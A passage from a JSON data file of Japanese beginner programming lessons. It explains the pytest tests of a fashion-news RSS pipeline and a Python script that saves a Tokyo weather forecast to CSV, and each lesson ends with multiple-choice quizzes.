      "explain": "コードには名前だけを書き、値は GitHub の Secrets に安全に保存します。"
     },
     {
      "question": "最後のステップで `seen_urls.json` をコミットする理由は？",
      "choices": [
       "実行用のパソコンは毎回捨てられるので、履歴を GitHub に残しておく必要があるから",
       "Notion に履歴を送るため",
       "テストを実行するため"
      ],
      "answer": 0,
      "explain": "保存しておかないと、次の回は「何を載せたか」を覚えていられません。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-09-workflow"
  },
  {
   "title": "test_pipeline.py ― 部品が正しく動くかを確かめるテスト",
   "language": "Python",
   "date": "2026-11-16",
   "level": 3,
   "series": "fashion_news",
   "part": 10,
   "concepts": [
    "testing",
    "functions",
    "modules"
   ],
   "lessons": [
    "100-ai-dev/08-testing",
    "10-python/05-functions",
    "10-python/08-modules"
   ],
   "summary": "11 個のテストで、RSS の読み取り・URL とタイトルの正規化・重複除去・ジャンル分けなどを確かめる。",
   "body": "## 📄 解説するコード\n\n`tests/conftest.py`\n\n```python\nimport sys\nfrom pathlib import Path\n\nsys.path.insert(0, str(Path(__file__).resolve().parents[1] / \"src\"))\n```\n\n`tests/test_pipeline.py`（抜粋）\n\n```python\nfrom datetime import datetime, timedelta, timezone\n\nimport yaml\n\nfrom fashion_news.classify import classify\nfrom fashion_news.dedupe import dedupe, filter_recent, normalize_title, normalize_url\nfrom fashion_news.fetch import parse_feed\nfrom fashion_news.main import group_articles, prune_seen, render_text\nfrom fashion_news.models import Article\nfrom fashion_news.notion import build_blocks\n\nRSS = \"\"\"<?xml version=\"1.0\"?><rss version=\"2.0\"><channel><title>t</title>\n<item><title>パリコレクション開幕</title><link>https://ex.com/a?utm_source=x</link>\n<pubDate>Fri, 13 Nov 2026 20:00:00 +0000</pubDate></item>\n<item><title></title><link>https://ex.com/empty</link></item>\n</channel></rss>\"\"\"\n\nCONFIG = yaml.safe_load(open(\"config/categories.yaml\", encoding=\"utf-8\"))\nNOW = datetime(2026, 11, 13, 21, 0, tzinfo=timezone.utc)\n\n\ndef art(title, url=\"https://ex.com/1\", kind=\"media\", pub=None):\n    return Article(title, url, \"src\", kind, pub)\n\n\ndef test_parse_feed_skips_empty_title_and_parses_date():\n    items = parse_feed(RSS, \"ex\", \"media\")\n    assert len(items) == 1\n    assert items[0].published == datetime(2026, 11, 13, 20, 0, tzinfo=timezone.utc)\n\n\ndef test_normalize_url_strips_tracking_and_fragment():\n    assert normalize_url(\"https://EX.com/a/?utm_source=x&id=1#top\") == \"https://ex.com/a?id=1\"\n\n\ndef test_dedupe_by_url_title_and_seen():\n    items = [\n        art(\"新作スニーカーが発売\", \"https://ex.com/1\"),\n        art(\"新作スニーカーが発売 - 別媒体\", \"https://other.com/2\"),\n        art(\"別の話題\", \"https://ex.com/3\"),\n        art(\"掲載済み\", \"https://ex.com/4\"),\n    ]\n    out = dedupe(items, {\"https://ex.com/4\"})\n    assert [a.title for a in out] == [\"新作スニーカーが発売\", \"別の話題\"]\n\n\ndef test_classify_priority_and_fallback():\n    assert classify(art(\"ミラノでコレクション発表\"), CONFIG) == \"ハイブランド/コレクション\"\n    assert classify(art(\"ナイキ新作スニーカー\"), CONFIG) == \"ストリート/スニーカー\"\n    assert classify(art(\"決算を発表\"), CONFIG) == \"業界・ビジネス\"\n    assert classify(art(\"何でもない記事\"), CONFIG) == \"その他\"\n    assert classify(art(\"ナイキ新作\", kind=\"official\"), CONFIG) == \"公式発表・ニッチ\"\n\n\ndef test_page_title_morning_and_evening():\n    from fashion_news.main import page_title\n\n    assert page_title(datetime(2026, 11, 13, 21, 45, tzinfo=timezone.utc)) == \"2026-11-14 朝刊\"\n    assert page_title(datetime(2026, 11, 14, 8, 45, tzinfo=timezone.utc)) == \"2026-11-14 夕刊\"\n```\n\n（実際のファイルにはこのほか、タイトルの正規化・古い記事の除外・Notion ブロックの組み立て・履歴の整理・20 件の上限・ファッション記事への絞り込みのテストがあり、全部で 11 個です）\n\n## 🧭 ひとことで言うと\n\n**Python**（pytest）で書かれた **テストコード** です。「この入力を渡したら、この結果になるはず」を 11 個書いておき、部品が期待どおり動くかを自動で確かめます。インターネットや Notion には一切つながず、手元だけで確かめられるように作られています。\n\n## 🗺️ 全体の流れ\n\n1. `PYTHONPATH=src python -m pytest` を実行する\n2. pytest が `tests/` の中の `test_` で始まる関数を全部見つけて、1 つずつ実行する\n3. 各テストの中の `assert` がすべて成り立てば「passed（成功）」、1 つでも違えば「failed（失敗）」\n4. `conftest.py` は、テストの前に自動で読まれる準備用のファイル\n\n## 🔍 ブロックごとの解説\n\n### conftest.py：import できるようにする準備\n\n```python\nsys.path.insert(0, str(Path(__file__).resolve().parents[1] / \"src\"))\n```\n\n`sys.path` は「Python がモジュールを探しに行く場所のリスト」です。その先頭に `src` フォルダを足すことで、テストから `import fashion_news...` と書けるようにしています。\n\n### 本物の代わりに「見本のデータ」を使う\n\n```python\nRSS = \"\"\"<?xml version=\"1.0\"?><rss ...>\n<item><title>パリコレクション開幕</title>...</item>\n<item><title></title><link>https://ex.com/empty</link></item>\n</channel></rss>\"\"\"\n```\n\n本物のサイトから RSS を取ってくると、ネットの状態や記事の中身でテスト結果が変わってしまいます。\nそこで **小さな見本の RSS を文字列で用意** し、`parse_feed` に直接渡しています。2 件目はわざとタイトルを空にしていて、「空のタイトルは飛ばす」ことを確かめています。\n\n```python\nNOW = datetime(2026, 11, 13, 21, 0, tzinfo=timezone.utc)\n```\n\n「今」も固定しています。`datetime.now()` を使うと、実行する日によって結果が変わるからです。`main.py` の `run` が `now` を引数で受け取れるように作られていたのは、このためでもあります。\n\n### art：テスト用の記事を手早く作る関数\n\n```python\ndef art(title, url=\"https://ex.com/1\", kind=\"media\", pub=None):\n    return Article(title, url, \"src\", kind, pub)\n```\n\n毎回 `Article(...)` に 5 つの値を書くのは大変なので、タイトルだけ渡せば作れる小さな関数を用意しています。\n\n### テストを 1 つ読んでみる\n\n```python\ndef test_dedupe_by_url_title_and_seen():\n    items = [\n        art(\"新作スニーカーが発売\", \"https://ex.com/1\"),\n        art(\"新作スニーカーが発売 - 別媒体\", \"https://other.com/2\"),\n        art(\"別の話題\", \"https://ex.com/3\"),\n        art(\"掲載済み\", \"https://ex.com/4\"),\n    ]\n    out = dedupe(items, {\"https://ex.com/4\"})\n    assert [a.title for a in out] == [\"新作スニーカーが発売\", \"別の話題\"]\n```\n\n| 記事 | 残る？ | 理由 |\n|---|---|---|\n| 新作スニーカーが発売 | ⭕ | 最初の記事 |\n| 新作スニーカーが発売 - 別媒体 | ❌ | 末尾の媒体名を取ると 1 つ目と同じタイトル |\n| 別の話題 | ⭕ | 新しい話題 |\n| 掲載済み | ❌ | URL が掲載済みの一覧に入っている |\n\nテストの名前（`by_url_title_and_seen`）と `assert` を読むだけで、**dedupe が何をするはずの関数か** が分かります。テストは「動く仕様書」でもあるのです。\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `assert 式 == 期待値` | 成り立たなければテスト失敗。pytest は違いを分かりやすく表示してくれる |\n| `\"\"\"...\"\"\"` | 複数行の文字列。見本の RSS をそのまま書くのに便利 |\n| 関数の中の `from ... import` | そのテストだけで使う import。動きは同じ |\n| `dict(CONFIG, max_per_category=2)` | CONFIG をコピーして 1 か所だけ変えた辞書を作る（元の CONFIG は変えない） |\n\n## 🔑 キーワード\n\n- **pytest**：Python で最もよく使われるテストのためのツール\n- **assert**：「この条件が成り立つはず」という確認\n- **テストデータ（フィクスチャ）**：テストのために用意した見本のデータ\n- **conftest.py**：pytest がテストの前に自動で読む準備用のファイル\n- **sys.path**：Python がモジュールを探す場所の一覧\n- **単体テスト**：部品（関数）ごとに動きを確かめるテスト\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ ネットや Notion につながずに確かめられるので、速く、何度でも同じ結果になる\n- ✅ 日時を固定していて、実行日に左右されない\n- ✅ 境界になる場合（空のタイトル、日付なし、上限ちょうど）を確かめている\n- ⚠️ `notion.py` の通信部分（リトライなど）や `fetch_all`（失敗しても続ける）はテストされていない。通信を「偽物」に差し替える仕組み（モック）を使えばテストできる\n- ⚠️ `open(\"config/categories.yaml\")` はリポジトリの一番上から実行する前提。別の場所から pytest を実行するとファイルが見つからない\n- ⚠️ GitHub Actions ではテストを実行していない（`daily.yml` は本番実行だけ）。push のたびにテストを自動で動かす設定を足すと安心\n\n## 🗣️ 30 秒で人に説明するなら\n\n「tests フォルダには pytest のテストが 11 個あります。見本の RSS や固定した日時を使って、ネットや Notion につながずに、RSS の読み取り、URL とタイトルの正規化、重複の除去、ジャンル分け、朝刊・夕刊の判定などが期待どおりかを assert で確かめています。\nAI に修正を頼んだあとにこれを実行すれば、前の機能を壊していないかすぐに分かります。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "テストで本物のサイトから RSS を取らず、見本の文字列を使う理由は？",
      "choices": [
       "本物の RSS は Python で読めないから",
       "ネットの状態や記事の中身に左右されず、毎回同じ結果で確かめられるから",
       "テストを長くするため"
      ],
      "answer": 1,
      "explain": "テストは何度実行しても同じ結果になることが大切です。"
     },
     {
      "question": "`assert len(items) == 1` が失敗するのはどんなとき？",
      "choices": [
       "items の数が 1 以外のとき",
       "items の数が 1 のとき",
       "items が空のときだけ"
      ],
      "answer": 0,
      "explain": "assert の条件が成り立たないと失敗になります。"
     },
     {
      "question": "`NOW = datetime(2026, 11, 13, 21, 0, ...)` のように「今」を固定している理由は？",
      "choices": [
       "2026 年に実行するため",
       "実行する日によって結果が変わらないようにするため",
       "時刻の計算を速くするため"
      ],
      "answer": 1,
      "explain": "datetime.now() を使うと、日によってテストが通ったり通らなかったりしてしまいます。"
     }
    ]
   ],
   "id": "2026-11-16-fashion-news-10-tests"
  },
  {
   "title": "天気予報を取得して CSV に保存するスクリプト",
   "language": "Python",
   "date": "2026-11-16",
   "level": 3,
   "concepts": [
    "http_api",
    "data_formats",
    "io",
    "errors",
    "functions",
    "modules"
   ],
   "lessons": [
    "10-python/05-functions",
    "10-python/07-exceptions",
    "10-python/08-modules",
    "10-python/11-files-and-json",
    "10-python/12-type-hints-dataclass"
   ],
   "summary": "無料の天気 API から 1 週間分の気温を取り、CSV ファイルに書き出す。",
   "body": "> 📝 これはサンプルです。Claude にコードを貼ると、このような解説ページが追加されます。\n\n## 📄 解説するコード\n\n```python\nimport csv\nimport sys\nfrom pathlib import Path\n\nimport requests\n\nAPI_URL = \"https://api.open-meteo.com/v1/forecast\"\n\n\ndef fetch_forecast(lat: float, lon: float) -> dict:\n    params = {\n        \"latitude\": lat,\n        \"longitude\": lon,\n        \"daily\": \"temperature_2m_max,temperature_2m_min\",\n        \"timezone\": \"Asia/Tokyo\",\n    }\n    response = requests.get(API_URL, params=params, timeout=10)\n    response.raise_for_status()\n    return response.json()\n\n\ndef save_csv(data: dict, path: Path) -> int:\n    daily = data[\"daily\"]\n    rows = zip(daily[\"time\"], daily[\"temperature_2m_max\"], daily[\"temperature_2m_min\"])\n    with path.open(\"w\", newline=\"\", encoding=\"utf-8\") as f:\n        writer = csv.writer(f)\n        writer.writerow([\"date\", \"max\", \"min\"])\n        count = 0\n        for row in rows:\n            writer.writerow(row)\n            count += 1\n    return count\n\n\ndef main() -> None:\n    try:\n        data = fetch_forecast(35.68, 139.76)\n    except requests.RequestException as e:\n        print(f\"取得に失敗しました: {e}\", file=sys.stderr)\n        sys.exit(1)\n    n = save_csv(data, Path(\"forecast.csv\"))\n    print(f\"{n} 日分を保存しました\")\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n## 🧭 ひとことで言うと\n\n**Python** で書かれた、東京の 1 週間の最高・最低気温をインターネットから取得し、`forecast.csv` に保存するスクリプトです。\n\n## 🗺️ 全体の流れ\n\n1. 一番下の `if __name__ == \"__main__\":` から `main()` が呼ばれる（入口）\n2. `fetch_forecast` が天気 API にアクセスし、JSON を辞書として受け取る（**入力**）\n3. `save_csv` が辞書から日付・最高・最低気温を取り出し、CSV に 1 行ずつ書く（**処理**）\n4. 何日分保存したかを表示する（**出力**）。通信に失敗したらメッセージを出して終了\n\n## 🔍 ブロックごとの解説\n\n### import と定数\n\n```python\nimport requests\nAPI_URL = \"https://api.open-meteo.com/v1/forecast\"\n```\n\n`csv`・`sys`・`pathlib` は標準ライブラリ、`requests` は外部ライブラリ（`pip install requests` が必要）。\n`API_URL` が全部大文字なのは「変更しない値（定数）」という慣習です。\n\n### fetch_forecast：API からデータを取る\n\n```python\nresponse = requests.get(API_URL, params=params, timeout=10)\nresponse.raise_for_status()\nreturn response.json()\n```\n\n- `params=` に辞書を渡すと、`?latitude=35.68&longitude=...` のように URL に付け足してくれる\n- `timeout=10`：10 秒応答がなければ諦める。**付けないと永遠に待つ可能性がある** ので、丁寧なコードの証拠\n- `raise_for_status()`：サーバーが 404 や 500 を返したら例外を起こす。JavaScript の `if (!res.ok)` と同じ役割\n- `.json()`：返ってきた JSON 文字列を Python の辞書に変換\n\n型ヒント `-> dict` から「辞書を返す関数」と分かります。\n\n### save_csv：zip で 3 つのリストを束ねる\n\n```python\nrows = zip(daily[\"time\"], daily[\"temperature_2m_max\"], daily[\"temperature_2m_min\"])\n```\n\nAPI は `{\"time\": [日付…], \"temperature_2m_max\": [気温…], ...}` のように **列ごとのリスト** で返します。\n`zip` はそれを `(\"2026-11-16\", 18.2, 9.1)` のように **行ごと** にまとめ直す関数です（ファスナーを閉じるイメージ）。\n\n```python\nwith path.open(\"w\", newline=\"\", encoding=\"utf-8\") as f:\n```\n\n`with` で開くので、書き終わったら自動で閉じます。`newline=\"\"` は CSV で空行が挟まるのを防ぐお約束です。\n\n### main：エラーに備える\n\n```python\nexcept requests.RequestException as e:\n    print(f\"取得に失敗しました: {e}\", file=sys.stderr)\n    sys.exit(1)\n```\n\n`RequestException` は requests のあらゆる通信エラー（タイムアウト・接続失敗・404 など）の親。\n`file=sys.stderr` はエラー用の出力先、`sys.exit(1)` は「失敗して終わった」ことを OS に伝える終わり方です（0 が成功）。\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `zip(a, b, c)` | 複数のリストを並べて 1 つずつ取り出す。長さが違うと **短い方に合わせて黙って切れる** |\n| `Path(\"forecast.csv\")` | 文字列ではなく Path オブジェクト。`path.open()` のようにメソッドが使える |\n| `count = 0 ... count += 1` | 実は `len(...)` を使うか、`enumerate` で書くこともできる |\n\n## 🔑 キーワード\n\n- **Web API**：プログラムからデータをもらうための窓口（URL）\n- **JSON**：API がよく返すデータ形式。Python では辞書とリストになる\n- **タイムアウト**：一定時間応答が無ければ諦める仕組み\n- **例外（RequestException）**：通信の失敗をまとめて受け止めるための型\n- **zip**：複数の並びを「行」に束ねる関数\n- **終了コード**：`sys.exit(1)` の 1。0 なら成功、それ以外は失敗\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ `timeout` と `raise_for_status()` があり、通信まわりは丁寧\n- ⚠️ `save_csv` は API の形が変わると `KeyError` で止まる（`data[\"daily\"]` が無い場合）。信頼できる API なので実用上は問題ない\n- ⚠️ 実行するたびに `forecast.csv` を **上書き** する（`\"w\"` モード）。履歴を残したいなら日付をファイル名に入れる\n- ⚠️ 緯度経度が東京に固定。他の地域にしたいなら引数や設定にする\n- 必要な準備：`pip install requests`、インターネット接続\n\n## 🗣️ 30 秒で人に説明するなら\n\n「これは天気予報の API から東京の 1 週間分の最高・最低気温を取ってきて、CSV に保存するスクリプトです。\nrequests で API を呼んで JSON を辞書として受け取り、zip で日付と気温を行の形にまとめて csv モジュールで書き出しています。\n通信はタイムアウトとステータスチェックをしていて、失敗したらエラーを出して終了します。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`response.raise_for_status()` が無かったら、サーバーが 500 エラーを返したときどうなる？",
      "choices": [
       "自動でリトライする",
       "エラーにならず、エラーページの中身を JSON として読もうとして別の場所で失敗しやすい",
       "プログラムが必ず止まる"
      ],
      "answer": 1,
      "explain": "ステータスコードのチェックは自分で行う必要があります（JavaScript の res.ok と同じ）。"
     },
     {
      "question": "`zip([\"a\", \"b\"], [1, 2])` から順に取り出されるのは？",
      "choices": [
       "(\"a\", 1), (\"b\", 2)",
       "(\"a\", \"b\"), (1, 2)",
       "[\"a\", 1, \"b\", 2]"
      ],
      "answer": 0,
      "explain": "同じ位置のものを組にして取り出します。"
     },
     {
      "question": "このスクリプトを他のファイルから `import` したとき、天気の取得は実行される？",
      "choices": [
       "される",
       "されない"
      ],
      "answer": 1,
      "explain": "`if __name__ == \"__main__\":` の中は、直接実行したときだけ動きます。"
     }
    ]
   ],
   "id": "2026-11-16-weather-to-csv"
  }
 ]
};
